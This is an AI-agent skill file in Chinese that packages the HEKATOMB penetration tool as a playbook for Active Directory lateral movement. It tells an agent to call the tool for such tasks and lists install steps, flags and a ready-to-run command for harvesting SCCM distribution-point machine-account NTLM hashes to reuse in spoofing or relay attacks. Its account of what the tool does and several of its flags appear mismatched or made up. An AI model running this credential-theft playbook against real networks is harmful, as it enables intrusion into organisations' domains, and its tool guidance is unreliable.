---
name: hekatomb-dp-secret
description: 渗透工具 skill:HEKATOMB 的安装、参数速查与攻击场景 playbook。当任务涉及 AD与横向移动 需要调用 HEKATOMB 时使用。
when-to-use: 渗透工具 skill:HEKATOMB 的安装、参数速查与攻击场景 playbook。当任务涉及 AD与横向移动 需要调用 HEKATOMB 时使用。
---

# HEKATOMB

- 攻击大类:C30 AD与横向移动
- 上游仓库:https://github.com/ProcessusT/HEKATOMB
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/ProcessusT/HEKATOMB && cd HEKATOMB && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1` | DP 共享机器账户 NTLM 哈希收割 |
| `-dnscorp` | 自动找域控 |
| `-all` | 打全部 DP |
| `-k 10.0.0.5` | 指定单个 DP |

## 攻击场景 Playbook

### SCCM DP 机器账户哈希窃取

```bash
python3 hekatomb.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1
# 拿到 DP 机器账户 NTLM→可作为 sAMAccountName spoof 或 Relay 素材
```

## 注意事项

专攻 SCCM 分发点(DP)的机器账户 NTLM 哈希窃取,是 SCCM 攻击链的关键一环。
